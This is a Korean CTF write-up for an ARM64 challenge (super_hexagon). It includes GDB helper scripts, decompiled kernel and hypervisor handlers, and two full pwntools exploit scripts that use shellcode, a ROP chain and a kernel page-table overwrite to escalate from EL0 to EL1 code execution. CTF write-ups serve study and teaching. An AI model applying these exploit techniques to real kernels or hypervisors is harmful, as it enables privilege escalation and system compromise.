        cpsr = (int(gdb.parse_and_eval("$cpsr")))
        mode = cpsr & 0b1111
        is_thumb = (cpsr >> 4)&1
        IRQ = (cpsr >> 5)&1
        FIQ = (cpsr >> 6)&1
        cond = (cpsr >> 27)&0b1111
        re = ''
        if 0b0000 == mode:
            re += 'EL0t' # SP_EL0
        elif 0b0100 == mode:
            re += 'EL1t' # SP_EL0
        elif 0b0101 == mode:
            re += 'EL1h' # SP_EL1
        elif 0b1000 == mode:
            re += 'EL2t' # SP_EL0
        elif 0b1001 == mode:
            re += 'EL2h' # SP_EL2
        elif 0b1100 == mode:
            re += 'EL3t' # SP_EL0
        elif 0b1101 == mode:
            re += 'EL3h' # SP_EL3
        else:
            re += 'UNK'
        re += '| '
        if IRQ:
            re += 'IRQ_MASKED | '
        elif FIQ:
            re += 'FIQ_MASKED | '
        if is_thumb:
            re += 'THUMB_MODE | '
        re += f'COND_{hex(cond)[2:]}'
        print(re)
import gdb
class TCR_EL1(gdb.Command):
    def __init__(self):
        super(TCR_EL1, self).__init__("tcr_el1", gdb.COMMAND_USER)
    def invoke(self, arg, from_tty):
        arg = arg.split()
        if len(arg) == 1:
            tcr = int(arg[0],16)
        elif len(arg) == 0:
            tcr = gdb.parse_and_eval('$TCR_EL1')
        else:
            print("usuage: tcr_el1 [value (optional)]")
            return
        T0SZ = tcr &0b111111
        T1SZ = tcr >> 16
        T1SZ &= 0b111111
        T1SZ = int(T1SZ)
        print("T0:",hex(0),'~',hex(2 ** (64-T0SZ)-1))
        print("T1:",hex(0x10000000000000000 - 2 ** (64-T1SZ)),'~',hex(0xffffffffffffffff))
TCR_EL1()
class QEMU_SUPPORT(gdb.Command):
    address_space = {
        'cpu-memory-0':{
            'system' : {
                'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff},
                'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff},
                'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff},
            }
        },
        'cpu-secure-memory-0': {
            'hitcon.flash0' : {'start' : 0x0000000000000000, 'end' : 0x0000000003ffffff},
            'system' : {
                'hitcon.flash1' : {'start' : 0x000000004000000, 'end' : 0x000000007ffffff},
                'pl011' : {'start' : 0x0000000009000000, 'end' : 0x0000000009000fff},
                'mach-hitcon.ram' : {'start' : 0x0000000040000000, 'end' : 0x0000000ffffffff},
            },
            'hitcon.secure-ram' : {'start' : 0x000000000e000000, 'end' : 0x000000000effffff}
        }
    } # monitor info mtree 
    @staticmethod
    def get_remote_pid(proc_name):
        pids = []
        for process in psutil.process_iter():
            if proc_name in process.name():
                pids.append(process.pid)
        if len(pids) != 1:
            return False
        return pids[0]
    def __init__(self):
        super(QEMU_SUPPORT, self).__init__("qemu_support", gdb.COMMAND_USER)
        pid = self.get_remote_pid('qemu-system-aarch64')
        if pid != False:
            self.pid = pid
    def read_memory(self, addr, length):
        gdb.selected_inferior().read_memory(addr, length).tobytes()
    def find_region_recursive(self, addr):
        def find_region_step(obj, key):
            assert type(obj) == type({})
            if 'start' in obj and 'end' in obj:
                if addr >= obj['start'] and addr <= obj['end']:
                    return key
                else:
                    return False
            else:
                for i in obj:
                    
                    if find_region_step(obj[i], i) != False:
                        return i
                return False
        return (find_region_step(QEMU_SUPPORT.address_space, ''))
    def read_phys(self, addr, length):
        def slow_path():
            ret = gdb.execute(f"monitor gpa2hva {addr}", to_string=True)
            r = re.search("is (0x[0-9a-f]+)", ret)
            if r:
                host_va = int(r.group(1),16)
                with open(f'/proc/{self.pid}/mem','rb') as f:
                    f.seek(host_va)
                    data = f.read(length)
                return data
            else:
                print('Err read_phys() -> slow_path()')
        def fast_path():
            gdb.execute(f'monitor xp/{length//8}xg {addr}')
            return True
        reg = self.find_region_recursive(addr) # secure mem or non-secure?
        if reg == 'cpu-secure-memory-0':
            return slow_path()
        elif reg == 'cpu-memory-0':
            return fast_path()
        else:
            print("Err find_region_recursive()",reg)
            return
       # secure world can access non-secure mem as well as secure mem.
    def invoke(self, arg, from_tty):
        arg = arg.split()
        if len(arg) > 0:
            if arg[0] == 'read_phys':
                if len(arg) > 2:
                    if arg[1].startswith('0x'):
                        addr = int(arg[1],16)
                    else:
                        addr = int(arg[1],10)
                    if arg[2].startswith('0x'):
                        length = int(arg[2],16)
                    else:
                        length = int(arg[2],10)
                    data = self.read_phys(addr, length*8)
                    if data != True:
                        self.qword_dump(data, addr,length)
        else:
            print("invalid args")
    @staticmethod
    def qword_dump(data, addr, length):
        for i in range(length):
            if i%2==0:
                ad = hex(addr + i*0x8)[2:].rjust(16,'0')
                print(f'{ad}',end=': ')
            a = hex(struct.unpack("<Q", data[8*i:8*i+8])[0])[2:].rjust(16,'0')
            print(f"0x{a}",end = ' ')
            if i%2==1:
                print()
        if (length-1)%2==0:
            print()
QEMU_SUPPORT()
TCR_EL1()
CPSR()
```
메모리 트리를 직접 확인해서 secure memory를 포함한 맵을 직접 하드코딩했다.
![](attachment/e84a665d28fb391cbc5cc5e026d39b12.png)
정상적으로 secure memory를 확인할 수 있게 되었다.
이를 이용하면 직접 다른 exception level들이 어떻게 secure memory에 적재되는지 확인할 수 있을 것이다.
# EL1, Non-secure Kernel
유저 애플리케이션을 익스플로잇했으니 이제 커널로의 권한 상승을 해야한다.
bata24 gef에선 arm64에 대한 pagewalk가 지원된다.
![](attachment/0f3e0ae338f07707cbc92b95aa10f5a9.png)
이런식으로 가상주소 매핑도 얻을 수 있다.
![](attachment/dc92a9c33bd8f7ce2b0dab47cd40648e.png)
VBAR을 확인하면 handler들이 보인다.. 

![](attachment/46a3de22d67a2d11bc915aad8668153d.png)
system call은 synchronous 하고 lower exception level에서부터 발생한다.
![](attachment/f886d36dd21a4f46292ec937c9c7c67e.png)
```C
void UndefinedFunction_ffffffffc000a400(void)
{
  code *UNRECOVERED_JUMPTABLE;
  undefined8 uVar1;
  
  FUN_ffffffffc00090b0();
  uVar1 = ttbr0_el1;
  spsel = 0;
  FUN_ffffffffc0008ba8();
  FUN_ffffffffc000914c();
                    /* WARNING: Treating indirect jump as call */
  UNRECOVERED_JUMPTABLE = (code *)UndefinedInstructionException(0,0xffffffffc000a834);
  (*UNRECOVERED_JUMPTABLE)();
  return;
}
```
FUN_ffffffffc00090b0를 먼저 확인하자.
```C
                             *************************************************************
                             *                           FUNCTION                          
                             *************************************************************
                             undefined  FUN_ffffffffc00090f8 (undefined  param_1 , undef
             undefined         w0:1           <RETURN>
             undefined         w0:1           param_1
             undefined         w1:1           param_2
             undefined         w2:1           param_3
             undefined         w3:1           param_4
             undefined         w4:1           param_5
             undefined         w5:1           param_6
             undefined         w6:1           param_7
             undefined         w7:1           param_8
             undefined8        Stack[0x0]:8   param_9                                 XREF[1]:     ffffffffc00090f8
             undefined         Stack[0x8]:1   param_10
             undefined8        Stack[0x10]:8  param_11                                XREF[1]:     ffffffffc00090fc
             undefined8        Stack[0x20]:8  param_12                                XREF[1]:     ffffffffc0009100
             undefined8        Stack[0x30]:8  param_13                                XREF[1]:     ffffffffc0009104
             undefined8        Stack[0x40]:8  param_14                                XREF[1]:     ffffffffc0009108
             undefined8        Stack[0x50]:8  param_15                                XREF[1]:     ffffffffc000910c
             undefined8        Stack[0x60]:8  param_16                                XREF[1]:     ffffffffc0009110
             undefined8        Stack[0x70]:8  param_17                                XREF[1]:     ffffffffc0009114
             undefined8        Stack[0x80]:8  param_18                                XREF[1]:     ffffffffc0009118
             undefined8        Stack[0x90]:8  param_19                                XREF[1]:     ffffffffc000911c
             undefined8        Stack[0xa0]:8  param_20                                XREF[1]:     ffffffffc0009120
             undefined8        Stack[0xb0]:8  param_21                                XREF[1]:     ffffffffc0009124
             undefined8        Stack[0xc0]:8  param_22                                XREF[1]:     ffffffffc0009128
             undefined8        Stack[0xd0]:8  param_23                                XREF[1]:     ffffffffc000912c
             undefined8        Stack[0xe0]:8  param_24                                XREF[1]:     ffffffffc0009138
             undefined8        Stack[0xf8]:8  param_25                                XREF[1]:     ffffffffc0009130
                             FUN_ffffffffc00090f8                            XREF[1]:     FUN_ffffffffc000914c:ffffffffc00
     fffc00090f8 e0  07  40  a9    ldp        param_1 ,param_2 ,[sp]=>param_9
     fffc00090fc e2  0f  41  a9    ldp        param_3 ,param_4 ,[sp, #param_11 ]
     fffc0009100 e4  17  42  a9    ldp        param_5 ,param_6 ,[sp, #param_12 ]
     fffc0009104 e6  1f  43  a9    ldp        param_7 ,param_8 ,[sp, #param_13 ]
     fffc0009108 e8  27  44  a9    ldp        x8,x9,[sp, #param_14 ]
     fffc000910c ea  2f  45  a9    ldp        x10 ,x11 ,[sp, #param_15 ]
     fffc0009110 ec  37  46  a9    ldp        x12 ,x13 ,[sp, #param_16 ]
     fffc0009114 ee  3f  47  a9    ldp        x14 ,x15 ,[sp, #param_17 ]
     fffc0009118 f0  47  48  a9    ldp        x16 ,x17 ,[sp, #param_18 ]
     fffc000911c f2  4f  49  a9    ldp        x18 ,x19 ,[sp, #param_19 ]
     fffc0009120 f4  57  4a  a9    ldp        x20 ,x21 ,[sp, #param_20 ]
     fffc0009124 f6  5f  4b  a9    ldp        x22 ,x23 ,[sp, #param_21 ]
     fffc0009128 f8  67  4c  a9    ldp        x24 ,x25 ,[sp, #param_22 ]
     fffc000912c fa  6f  4d  a9    ldp        x26 ,x27 ,[sp, #param_23 ]
     fffc0009130 fc  7f  40  f9    ldr        x28 ,[sp, #param_25 ]
     fffc0009134 1c  41  18  d5    msr        sp_el0 ,x28
     fffc0009138 fc  77  4e  a9    ldp        x28 ,x29 ,[sp, #param_24 ]
     fffc000913c c0  03  5f  d6    ret
```
+0x40에 x8이 있는 것을 기억하고 있자.
FUN_ffffffffc0008ba8가 메인 부분이다.
```C
void FUN_ffffffffc0008ba8(long param_1)
{
  ulong uVar1;
  bool bVar2;
  int iVar3;
  ulong uVar4;
  long lVar5;
  undefined8 uVar6;
  undefined *puVar7;
  undefined *puVar8;
  undefined *puVar9;
  undefined *puVar10;
  ulong uVar11;
  
  uVar11 = esr_el1;
  if (((uint)(uVar11 >> 26) & 0x3f) != 0b00010101) {
                    /* WARNING: Subroutine does not return */
    FUN_ffffffffc00091b0();
  }
  uVar11 = *(ulong *)param_1;
  puVar10 = *(undefined **)(param_1 + 8);
  puVar9 = *(undefined **)(param_1 + 0x10);
  uVar4 = *(ulong *)(param_1 + 0x40);
  puVar7 = puVar9;
  if (uVar4 == 0x3f) {
    if (puVar9 != (undefined *)0x0) {
      iVar3 = FUN_ffffffffc0009ad8();
      if (iVar3 < 0) {
        puVar7 = (undefined *)0xffffffffffffffff;
      }
      else {
        *puVar10 = (char)iVar3;
        puVar7 = (undefined *)0x1;
      }
    }
  }
  
...
```
![](attachment/897d9eab886106a9fb3854d3eeafbc71.png)
EC field에 대해 접근하고 있다.
![](attachment/05850d04d2bdbd1980000d9cceaf6ca5.png)
딱 봐도 이 함수는 위 두 값에 대한 비교를 하는 함수인 것을 알 수 있다.
  
```C
   ...
            }
          }
          else {
            usr = (undefined *)0xffffffffffffffff;
          }
        }
        else if ((x8 & 0xff000000) == 0xff000000) {
          usr = (undefined *)FUN_ffffffffc0008a34(x8,x0,x1,x2);
        }
        else {
          usr = (undefined *)0xffffffffffffffff;
        }
      }
    }
  }
  *(undefined **)param_1 = usr;
  return;
}
```
그리고 0xff로 마스킹되어서 처리하는 부분이 있는데, 여긴 secure world 관련 처리 로직이니 나중에 분석한다.
![](attachment/a27a6c6b0011f9ff1c9ddc4c624e2f08.png)
sys_read는 위 0xffffffffc9000000을 읽는다.
IPA는 0x3b000이며 PA는 0x9000000이다.
여긴 UART 공간이다.
![](attachment/4b2a63d6327f5f75dd1596be251140bf.png)
Memory mapped io (MMIO) 방식이다.
DMA와 함께 쓰인다.
sys_read는 내부적으로 1 바이트씩 여기서 읽고 리턴한다.
```C
  ...
                    /* read */
  usr = x2;
  if (x8 == 0x3f) {
    if (x2 != (undefined *)0x0) {
      iVar3 = FUN_ffffffffc0009ad8();
      if (iVar3 < 0) {
        usr = (undefined *)0xffffffffffffffff;
      }
      else {
        *x1 = (char)iVar3;
        usr = (undefined *)0x1;
      }
    }
  }
  else {
                    /* write */
    if (x8 == 0x40) {
      for (usr_page = (undefined *)0x0; usr_page < x2; usr_page = usr_page + 1) {
        FUN_ffffffffc0009aa4(usr_page[(long)x1]);
      }
    }
    else {
      if (x8 == 0x5d) {
                    /* WARNING: Subroutine does not return */
        FUN_ffffffffc00091b0();
      }
                    /* mmap  */
      if (x8 == 0xde) {
        if (x0 == 0) {
          if (((ulong)x1 & 0xfff) == 0) {
            usr = (undefined *)FUN_ffffffffc00086e8(x1);
            if (usr != (undefined *)0xffffffffffffffff) {
              phys = FUN_ffffffffc0008530(x1);
              for (usr_page = usr; usr_page < x1 + (long)usr; usr_page = usr_page + 0x1000) {
                FUN_ffffffffc0008864(usr_page,usr_page + (phys - (long)usr),(ulong)x2 & 0xffffffff );
...
```
처음에는 눈치를 못챘지만 모든 구현된 시스템 콜들을 분석하고 나서 다시 코드를 처음부터 봤더니 이상함을 느꼈다.
왜냐하면 ELx에서의 가상 주소 액세스는 분명 ELx의 translation table base address를 타고 변환될텐데 x1에 대한 privileged, unprivileged 체크가 없었기 때문이다.
다른 시스템 콜들의 경우 아래와 같이 1 단계 변환후 attribute를 비교해서 user memory인지 아닌지를 검사한다.
![](attachment/f3932dcbcd59271f076d99aa50a41130.png)
  
ret 1 byte overwrite → print_flag
ropper로 쭉 뽑고 보다가 0xffffffffc0009130를 쓸 수 있을 것 같아서 확인해보았다.
```C
     fffc0009130 fc  7f  40  f9    ldr        x28 ,[sp, #0xf8 ]
     fffc0009134 1c  41  18  d5    msr        sp_el0 ,x28
     fffc0009138 fc  77  4e  a9    ldp        x28 ,x29 ,[sp, #param_24 ]
     fffc000913c c0  03  5f  d6    ret
```
삽질하다가 메뉴얼을 뒤져보니 다음과 같이 UNDEFINED로 정의되어있었다.
![](attachment/966ec93ec69b3c16a73e85ce3659545c.png)
handler가 SP_ELxh에서 SP_ELxt로 최대한 빨리 전환을 시도하기에 절대 쓸 수 없는 가젯이다.
```C
     fffc0009430 f3  53  41  a9    ldp        x19 ,x20 ,[sp, #local_10 ]
     fffc0009434 fd  7b  c2  a8    ldp        x29 =>local_20 ,x30 ,[sp], #0x20
     fffc0009438 c0  03  5f  d6    ret
```
더 찾다가 위 가젯을 찾았다.
sp+80에 연속적으로 쓸 수 있으니 저기부터 흐름을 두 번 연속으로 변조하면 pc 컨트롤이 가능하다.
![](attachment/bf3dcbc5e1b2686e60a9d50861c8f7d2.png)
## Exploit code (flag)
```Python
from pwn import *
from keystone import *
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)

sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
mov x5, #-1
mov w4, #0x0
mov w3, #0x0
mov w2, #3
mov x1, #0x1000
mov x0, #0x0
mov x8, #0xde
svc #0x1337
mov x11, x0
mov w9, #0x0
loop:                   
    add x1, x11, x9
    mov x8, #0x3f
    mov x0, #0
    mov x2, #0x1
    svc #0x1337
    add w9, w9, #1
    cmp x9, #0x1000
    bne loop
mov x0, x11
mov x1, #0x1000
mov x2, #5
mov x8, #0xe2
svc #0x1337
blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode
p = remote('localhost',6666)
payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1
sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)
sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)
sla(b'cmd> ',b'2')
sla(b'index: ', str(1))
sleep(0.1)
stack_x29_x30 = 0xffffffffc0019bb0
addr = stack_x29_x30+0x50
ret = stack_x29_x30 + 8 + 1
ropchain = b''
ropchain += p64(0) # x29
ropchain += p64(0xffffffffc000847c) # x30
# 0xffffffffc000847c: mov x0, x19; ldr x19, [sp, #0x10]; ldp x29, x30, [sp], #0x20; ret; 
ropchain += p64(0x00007ffeffffe000) # x19 [EL0/R-X EL1/R-- ACCESSED GLOBAL]
ropchain += p64(0xdeadbeef) # x20
ropchain += p64(0) #x29
ropchain += p64(0xffffffffc0008408+ 4) # this will raise exception after ret
cnt = len(ropchain)# sfp
shellcode = f'''\
movz x11, #{((addr)>>48)&0xffff}, lsl #48
movk x11, #{((addr)>>32)&0xffff}, lsl #32
movk x11, #{((addr)>>16)&0xffff}, lsl #16
movk x11, #{(addr)&0xffff}, lsl #0
mov x9, #0x0
loop:                   
    add x1, x11, x9
    mov x8, #0x3f
    mov x0, #0
    mov x2, #0x1
    svc #0x1337
    add w9, w9, #1
    cmp x9, #{cnt}
    bne loop
movz x11, #{((ret)>>48)&0xffff}, lsl #48
movk x11, #{((ret)>>32)&0xffff}, lsl #32
movk x11, #{((ret)>>16)&0xffff}, lsl #16
movk x11, #{(ret)&0xffff}, lsl #0
mov x0, #0
mov x1, x11
mov x2, #1
svc #0x1337
'''
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
sleep(0.1)
p.send(ropchain)
sleep(0.1)
p.send(b'\x94')
p.interactive()
```
## Gaining code execution
Arm manual 정리하면서 page descriptor도 정리했다.
![](attachment/89ac8cbe2ee124fd2a1b1faaf7506c84.png)
Two VA ranges를 지원할 때 translation 과정은 stage 1과 stage 2로 나뉜다.
VA → IPA → PA 중에 실질적으로 공격할 수 있는건 IPA까지여서 VA → IPA를 속여서 공격하는 것을 생각해볼 수 있다.
이는 VA → IPA의 매핑 관계가 EL1의 영역에 존재하기에 가능하다.
잘 조작해서 임의 VA에 대해서 원하는 IPA로 매핑할 수 있다면, EL0 쪽 메모리와 매핑시켜 특권 레벨에서 code execution이 가능하다.
PAN을 확인해봤는데 PAN이 비활성화되어 있었으니 그냥 userland에 fake page table을 준비해두고 초기 코드에 TTBR에 대한 할당을 수행하는 특권 명령을 실행하는데 여기로 점프하면 임의 코드 실행을 얻을 수 있을 것 같았다.
![](attachment/f0426c50516cf19fabe5499a8ac8153c.png)
혹시 MMU 킨 상태에선 TTBR1에 대한 할당이 트랩을 일으킬까봐 메뉴얼을 봤더니 따로 그런 검증 로직은 없는 것으로 보인다.
```Python
     fffc000000c 20  20  18  d5    msr        ttbr1_el1 ,x0
     fffc0000010 00  02  80  d2    mov        x0,#0x10
     fffc0000014 00  02  b0  f2    movk       x0,#0x8010 , LSL #16
     fffc0000018 00  0c  c0  f2    movk       x0,#0x60 , LSL #32
     fffc000001c 40  20  18  d5    msr        tcr_el1 ,x0
     fffc0000020 df  3f  03  d5    isb
     fffc0000024 00  10  38  d5    mrs        x0,sctlr_el1
     fffc0000028 00  00  40  b2    orr        x0,x0,#0x1
     fffc000002c 00  10  18  d5    msr        sctlr_el1 ,x0
     fffc0000030 df  3f  03  d5    isb
     fffc0000034 e0  87  62  b2    orr        x0,xzr ,#-0x40000000
     fffc0000038 41  fe  03  10    adr        x1,-0x3fff8000
     fffc000003c 00  00  01  8b    add        x0,x0,x1
     fffc0000040 00  00  1f  d6    br         x0=>LAB_ffffffff80008000
```
어차피 TTBR1_EL1 바꾸면 두 번째 VA가 TTBR1 타고 변환하니 fault 안만들고 그냥 안정적으로 임의 코드 실행을 달성할 수 있을 것 같다.
근데 유저랜드에서 fake page table 만들려면 4kb 이상의 방대한 메모리가 필요하고, 하나 하나 다시 써야한다.
  
그래서 read로 EL1의 PTE를 덮어서 IPA를 바꿔주는 것을 선택했다.
아니면 유저쪽 PXN 비트를 떨구고 거기로 뛰어도 된다고 한다.
그게 더 간단하지만 풀 때는 그 생각을 못했다.
```Python
>>> int(bin(0xffffffffc001e000)[2:][::-1][12:21][::-1],2)
30
```
![](attachment/9ae597d10a403510f7f9d3a4aa046a26.png)
0xffffffffc001e000 -> 0x1e000 -> 0x4001e000로 변환되니까 저 부분을 수정하면 된다.
  
0x0040000000036483로 바꿔주면 미리 mmap 해놓은 유저 페이지를 실행하게 된다.
PTE 수정하려면 2바이트가 필요한데 read는 한번에 1바이트씩만 쓸 수 있다.
1바이트만 달라져도 qemu에서 tlb 자체를 완전한 환경에 맞춰 구현하지 않아 바로 fault가 발생한다.
  
그래서 저 페이지 테이블 자체를 가리키는 descriptor의 AP를 변경해서 EL0에서 RW를 만들었다.
그리고 EL0에서 8바이트 전체를 써주는 방식으로 진행하면 될것 같았다.
mprotect R-X를 해줘야 EL2 MMU에 변경된 execution 권한이 적용된다.
![](attachment/36bbd4f063e15828882e79552c0a158f.png)
FEAT_XNX가 비활성화 상태이다.
page descriptor 53 bit가 res0이고 54bit가 EL0과 EL1에 대한 execution control을 담당한다.
EL2는 물리 메모리로 접근하고 손으로 pagewalk해서 확인해보았다.
![](attachment/cb87a472465a0d95b35b3d83dc8ae180.png)
![](attachment/b8826cfe88662b242971135546c83f11.png)
mprotect r-x 안했을때 stage 2 translation의 주체인 EL2의 page table에 EL0/1 execution이 비활성화 되었음을 알 수 있다.
bata24 gef를 이용하고 있는데 버그가 있다.
```Python
1) 0x0000000000034000-0x0000000000037000  0x0000000040034000-0x0000000040037000  0x3000        0x1000      3      [EL0/R-X EL1/R-X ACCESSED]
2) 0x0000000000036000-0x000000000003b000  0x0000000040036000-0x000000004003b000  0x5000       0x1000      5      [EL0/RWX EL1/RWX ACCESSED]
```
1번이 mprotect r-x 해줬을 때 gef가 보여주는 EL2 매핑이다.
2번이 mprotect 안해줬을 때 gef가 보여주는 EL2 매핑이다.
gef 코드를 보니 따로 WXN는 신경을 쓰는데, FEAT_XNX는 stage 2라서 그런지 따로 확인하지 않는다.
실제로 2번은 EL2에서 RWX가 아니라 RW로 봐야한다.
## Exploit code (code execution)
```Python
from pwn import *
from keystone import *
sla = lambda x,y : p.sendlineafter(x,y)
sa = lambda x,y : p.sendafter(x,y)
context.binary = e = ELF('./super_hexagon/share/_bios.bin.extracted/BC010')
ks = Ks(KS_ARCH_ARM64,KS_MODE_LITTLE_ENDIAN)

sc_st = 0x7ffeffffd006
shellcode = b''
shellcode += bytes(ks.asm(f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0
    mov w9, #0x0
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #0x1000
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5
    mov x8, #0xe2
    svc #0x1337
    blr x11
''')[0])
assert b'\r' not in shellcode and b'\x0a' not in shellcode
p = remote('localhost',6666)
payload = b'A' * 0x100
payload += p64(0xdeadbeef) 
payload += p64(e.sym.gets) # cmd = 1
sla(b'cmd> ', b'1')
sla(b'index: ', str(0))
sla(b'key: ', payload)
sleep(0.1)
payload = b'A' * 0b101 + b'\x00'
payload += shellcode
p.sendline(payload)
sla(b'cmd> ', b'1')
sla(b'index: ', str(0x1000))
payload = b''
payload += b'A'*0b101 + b'\x00'
payload += b'A'*(0x100 - len(payload))
payload += p64(0xdeadbeef)
payload += p64(e.sym.mprotect)
payload += p64(sc_st)
sla(b'key: ', payload)
sla(b'cmd> ',b'2')
sla(b'index: ', str(1))
sleep(0.1)
entry = 0xffffffffc001e000 + 0xf0 
addr = 0xffffffffc00091b8
UART= 0xffffffffc9000000
EL1_shellcode = asm(f'nop')*(0x400//4)
EL1_shellcode += asm(f'''\
movz x11, #{((UART)>>48)&0xffff}, lsl #48
movk x11, #{((UART)>>32)&0xffff}, lsl #32
movk x11, #{((UART)>>16)&0xffff}, lsl #16
movk x11, #{(UART)&0xffff}, lsl #0
mov x0, #0x31
strb w0, [x11]
ret
''')
cnt = len(EL1_shellcode)
val = 0x0040000000036483
shellcode = f'''\
    mov x5, #-1
    mov w4, #0x0
    mov w3, #0x0
    mov w2, #3
    mov x1, #0x1000
    mov x0, #0x0
    mov x8, #0xde
    svc #0x1337
    mov x11, x0 // IPA 0x36000
    mov x9, #0x0 
    loop:                   
        add x1, x11, x9
        mov x8, #0x3f
        mov x0, #0
        mov x2, #0x1
        svc #0x1337
        add w9, w9, #1
        cmp x9, #{cnt}
        bne loop
    mov x0, x11
    mov x1, #0x1000
    mov x2, #5 // r-x
    mov x8, #0xe2
    svc #0x1337
    movz x11, #{((entry)>>48)&0xffff}, lsl #48
    movk x11, #{((entry)>>32)&0xffff}, lsl #32
    movk x11, #{((entry)>>16)&0xffff}, lsl #16
    movk x11, #{(entry)&0xffff}, lsl #0

    mov x0, #0
    mov x1, x11
    mov x8, #0x3f
    mov x2, #1
    svc #0x1337 // now we can modify the kernel page table
    movz x10, #{((val)>>48)&0xffff}, lsl #48
    movk x10, #{((val)>>32)&0xffff}, lsl #32
    movk x10, #{((val)>>16)&0xffff}, lsl #16
    movk x10, #{(val)&0xffff}, lsl #0
    sub x11, x11, #0xa0
    str x10, [x11]
    mov x8, #0x123
    svc #0x1337
'''
payload = bytes(ks.asm(shellcode)[0])
payload += b'\x41' * (0x1000 - len(payload))
p.send(payload)
sleep(0.1)
p.send(EL1_shellcode)
pause()
p.send(b'\x43') # AP 01 -> EL0 RW EL1 RW 
p.interactive()
'''[+] LEVEL0_BIT_RANGE: [39, 48]
[+] LEVEL1_BIT_RANGE: [30, 39]
[+] LEVEL2_BIT_RANGE: [21, 30]
[+] LEVEL3_BIT_RANGE: [12, 21]
[+] OFFSET_BIT_RANGE: [0, 12]
x/40xg 0xffffffffc0000000 + 0x28000  + 8*506'''
```
테스트를 위해 1을 계속 찍는 쉘코드를 넣었다.
# EL2, Virtual machine monitor
![](attachment/d76290c15ec8a1ecf6278e71e4688965.png)
커널까지 공격했으니 이제 hypervisor를 공격해서 vm escape를 해서 Normal world를 모두 컨트롤할 수 있도록 만들어야한다.
원래 EL1에서 EL3로 secure monitor call을 하는것도 EL2를 거쳐서 처리되기 때문에 여기를 공격 타겟으로 잡아야한다.
이 문제에선 Type 1 hypervisor를 채택한 구조다.
![](attachment/4681c70db1415e5680e82da836a4e1d3.png)
만약 Type 2 구조조였다면 공격 벡터를 추가적으로 저 highvisor 부분으로도 신경을 썼어야 하지 않았을까 생각한다.
```Python
ulong FUN_401003d8(long *saved_reg)
{
  long lVar1;
  ulong x1;
  int EC_;
  ulong EC;
  long x0;
  ulong ESR;
  
  ESR = esr_el2;
  EC = ESR >> 26 & 0x3f;
  x0 = *saved_reg;
  x1 = saved_reg[1];
  EC_ = (int)EC;
  if (EC_ == 0b00010110) {
    if (x0 == 1) {
      x1 = HVC_handler(x1,saved_reg[2],saved_reg[2],saved_reg[3]);
    }
    else {
      x0 = -1;
    }
  }
  else if (EC_ == 0b00010111) {
    if (x0 == 0x83000003) {
      if (x1 < 0x3c001) {
        x0 = SMC_handler(0x83000003,x1 + 0x40000000);
      }
      else {
        x0 = -1;
      }
    }
    else {
      x0 = SMC_handler(x0,x1);
    }
    lVar1 = elr_el2;
    x1 = lVar1 + 4;
                    /* terminate */
    elr_el2 = x1;
  }
  else {
    FUN_40101020(s_EC_=_%08x,_ISS_=_%08x_401021a8,EC,(uint)ESR & 0xffffff);
    x1 = FUN_401009c8();
  }
  *saved_reg = x0;
  return x1;
}
```
이전에 spsel = 0으로 해주고 위 함수로 점프한다.
EL1에서 smc를 통해 secure monitor를 call 할 수 있던 이유는 여기서 저런식으로 따로 핸들링을 다시 해줬기 때문이였다.
EL1에서 mmap, mprotect 핸들링시에 hypercall로 EL2를 부르는데 EL2는 여기서 EL2 page table을 변경한다.
```C
undefined * HVC_handler(ulong x1,ulong x2)
{
  undefined *puVar1;
  ulong uVar2;
  ulong idx_addr;
  
  idx_addr = x1 >> 12 & 0b0000000111111111;
  if (x1 == 0x3b000) {
    *(undefined8 *)(&DAT_40107000 + (idx_addr + (x1 >> 21) * 0x200) * 8) = 0x400000090004c3;
    return &DAT_40107000;
  }
  if (x1 < 0x3c000) {
                    /* x1 < 0xc000 and must not be writable */
    if ((x1 < 0xc000) && (((uint)x2 >> 7 & 1) != 0)) {
      FUN_4010009c(s__[VMM]_try_to_map_writable_pages_40102130);
      FUN_401006a8();
      FUN_40100774();
    }
    else {
                    /* (el0/el1 execution) and (no write) */
      if ((x2 & 0x40000000000080) != 0x80) {
                    /* ? IPA influences the determination of the PA. */
        puVar1 = (undefined *)(x1 + 0x40000000 | x2);
        *(undefined **)(&DAT_40107000 + (idx_addr + (x1 >> 21) * 0x200) * 8) = puVar1;
                    /* level2 descriptor n = 21 */
        return puVar1;
      }
    }
    FUN_4010009c(s__[VMM]_RWX_pages_are_not_allowed_40102168);
    FUN_401006a8();
    FUN_40100774();
  }
  FUN_4010009c(s__[VMM]_Invalid_IPA_40102190);
  FUN_401006a8();
  FUN_40100774();
  FUN_401009e4(&DAT_40106000,0,0x1000);
  FUN_401009e4(&DAT_40107000,0,0x8000);
  for (idx_addr = 0; idx_addr < 0x200000; idx_addr = idx_addr + 0x200000) {
    uVar2 = idx_addr >> 0x15 & 0x1ff;
    
  ...
```
분석하다가 얼마 안돼서 뭔가 이상함을 발견했다.
애초에 쓰는게 descriptor인데 IPA가 PA에 저렇게 raw하게 영향을 주면 안된다는 것을 깨달았다.
